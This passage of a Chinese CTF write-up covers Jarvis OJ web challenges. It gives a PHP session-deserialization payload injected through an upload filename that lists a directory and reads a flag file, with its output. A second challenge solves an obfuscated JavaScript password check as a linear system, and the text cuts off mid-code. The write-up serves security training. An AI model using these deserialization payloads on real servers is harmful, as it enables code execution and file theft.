class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(scandir(dirname(__FILE__)));'</span>;<span class="comment">#打印读取的文件内容</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>为防止转义，在引号前加上\。利用前面的html页面随便上传一个东西，抓包，把filename改为如下</p><blockquote><p>|O:5:\”OowoO\”:1:{s:4:\”mdzz\”;s:36:\”print_r(scandir(dirname(<strong>FILE</strong>)));\”;}</p></blockquote></li><li><p>注意前面有| ,然后随便上传东西抓包,为filename为上述,得到回显</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;/code&gt;<span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; Here_1s_7he_fl4g_buT_You_Cannot_see.php</span><br><span class="line">    [<span class="number">3</span>] =&gt; index.php</span><br><span class="line">    [<span class="number">4</span>] =&gt; phpinfo.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>根据phpinfo得到路径/opt/lampp/htdocs/</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mdzz</span>改为<span class="symbol">:print_r</span>(file_get_contents(<span class="string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span>));</span><br><span class="line">↓</span><br><span class="line"><span class="symbol">O:</span><span class="number">5</span><span class="symbol">:<span class="string">"OowoO"</span></span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"mdzz"</span></span>;<span class="symbol">s:</span><span class="number">88</span><span class="symbol">:<span class="string">"print_r(file_get_contents("</span>/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see</span>.php<span class="string">"));"</span>;&#125;</span><br><span class="line">↓</span><br><span class="line">|<span class="symbol">O:</span><span class="number">5</span><span class="symbol">:</span>\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>抓包改filename</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$flag=<span class="string">"CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li></ol><p><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">参考资料</a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><p>题目入口：<a href="http://web.jarvisoj.com:9891/" target="_blank" rel="noopener">http://web.jarvisoj.com:9891/</a></p><blockquote><p>这么简单的题，是WEB吗？</p></blockquote><ol><li>有个密码输入框，随便输入点返回<strong>Wrong Password!!</strong></li><li><p>查源码发现有个app.js点进去,查找<strong>Wrong Password!!</strong>,主要代码如下</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            key: <span class="string">"__checkpass__REACT_HOT_LOADER__"</span>,</span><br><span class="line">            value: function(<span class="name">e</span>) &#123;</span><br><span class="line">                if (<span class="number">25</span> !== e.length) return ! <span class="number">1</span><span class="comment">;</span></span><br><span class="line">                for (<span class="name"><span class="builtin-name">var</span></span> t = [], n = <span class="number">0</span><span class="comment">; n &lt; 25; n++) t.push(e.charCodeAt(n));</span></span><br><span class="line">                for (<span class="name"><span class="builtin-name">var</span></span> r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>], o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]], n = <span class="number">0</span><span class="comment">; n &lt; 25; n++) &#123;</span></span><br><span class="line">                    for (<span class="name"><span class="builtin-name">var</span></span> i = <span class="number">0</span>,</span><br><span class="line">                    a = <span class="number">0</span><span class="comment">; a &lt; 25; a++) i += t[a] * o[n][a];</span></span><br><span class="line">                    if (<span class="name">i</span> !== r[n]) return ! <span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">                return ! <span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            key: <span class="string">"__handleTouchTap__REACT_HOT_LOADER__"</span>,</span><br><span class="line">            value: function() &#123;</span><br><span class="line">                var e = this.state.passcontent,</span><br><span class="line">                t = &#123;</span><br><span class="line">                    passowrd: e</span><br><span class="line">                &#125;<span class="comment">;</span></span><br><span class="line">                self = this,</span><br><span class="line">                $.post(<span class="string">"checkpass.json"</span>, t,</span><br><span class="line">                function(<span class="name">t</span>) &#123;</span><br><span class="line">                    self.checkpass(<span class="name">e</span>) ? self.setState(&#123;</span><br><span class="line">                        errmsg: <span class="string">"Success!!"</span>,</span><br><span class="line">                        errcolor: b.green400</span><br><span class="line">                    &#125;) : (<span class="name">self.setState</span>(&#123;</span><br><span class="line">                        errmsg: <span class="string">"Wrong Password!!"</span>,</span><br><span class="line">                        errcolor: b.red400</span><br><span class="line">                    &#125;), setTimeout(<span class="name">function</span>() &#123;</span><br><span class="line">                        self.setState(&#123;</span><br><span class="line">                            errmsg: <span class="string">""</span></span><br><span class="line">                        &#125;)</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="number">3</span>e3))</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></li><li><p>是个25元一次方程，求解</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">a = np.array([<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>])</span><br><span class="line">b = np.array([[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, 